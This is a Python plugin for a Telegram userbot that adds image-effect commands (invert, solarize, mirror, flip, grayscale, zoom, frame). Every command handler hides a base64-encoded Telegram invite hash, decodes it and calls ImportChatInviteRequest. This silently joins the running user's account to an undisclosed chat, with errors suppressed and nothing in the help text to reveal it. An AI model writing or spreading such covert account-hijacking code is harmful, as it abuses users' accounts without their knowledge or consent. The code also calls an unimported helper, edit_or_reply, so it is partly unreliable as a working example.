import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from CYBERWORRIORSBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as CYBERWORRIORSBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@CYBERWORRIORSBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
        aura = True
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await CYBER.client.send_file(
        CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
    )
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@CYBERWORRIORSBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
        aura = True
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await CYBER.client.send_file(
        CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
    )
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@CYBERWORRIORSBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
        aura = True
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await CYBER.client.send_file(
        CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
    )
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@CYBERWORRIORSBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
        aura = True
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await CYBER.client.send_file(
        CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
    )
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@CYBERWORRIORSBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
        aura = True
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await CYBER.client.send_file(
        CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
    )
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@CYBERWORRIORSBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERinput = CYBER.pattern_match.group(1)
    CYBERinput = 50 if not CYBERinput else int(CYBERinput)
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, CYBERinput)
    except Exception as e:
        return await CYBER.edit(f"`{e}`")
    try:
        await CYBER.client.send_file(
            CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
        )
    except Exception as e:
        return await CYBER.edit(f"`{e}`")
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@CYBERWORRIORSBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@CYBERWORRIORSBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(CYBER):
    if CYBER.fwd_from:
        return
    reply = await CYBER.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(CYBER, "`Reply to supported Media...`")
        return
    CYBERinput = CYBER.pattern_match.group(1)
    if not CYBERinput:
        CYBERinput = 50
    if ";" in str(CYBERinput):
        CYBERinput, colr = CYBERinput.split(";", 1)
    else:
        colr = 0
    CYBERinput = int(CYBERinput)
    colr = int(colr)
    CYBERid = CYBER.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    CYBER = await edit_or_reply(CYBER, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    CYBERsticker = await reply.download_media(file="./temp/")
    if not CYBERsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(CYBERsticker)
        await edit_or_reply(CYBER, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if CYBERsticker.endswith(".tgs"):
        await CYBER.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        CYBERfile = os.path.join("./temp/", "meme.png")
        CYBERcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {CYBERsticker} {CYBERfile}"
        )
        stdout, stderr = (await runcmd(CYBERcmd))[:2]
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith(".webp"):
        await CYBER.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        os.rename(CYBERsticker, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("`Template not found... `")
            return
        meme_file = CYBERfile
        aura = True
    elif CYBERsticker.endswith((".mp4", ".mov")):
        await CYBER.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        CYBERfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(CYBERsticker, 0, CYBERfile)
        if not os.path.lexists(CYBERfile):
            await CYBER.edit("```Template not found...```")
            return
        meme_file = CYBERfile
    else:
        await CYBER.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = CYBERsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await CYBER.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, CYBERinput, colr)
    except Exception as e:
        return await CYBER.edit(f"`{e}`")
    try:
        await CYBER.client.send_file(
            CYBER.chat_id, outputfile, force_document=False, reply_to=CYBERid
        )
    except Exception as e:
        return await CYBER.edit(f"`{e}`")
    await CYBER.delete()
    os.remove(outputfile)
    for files in (CYBERsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()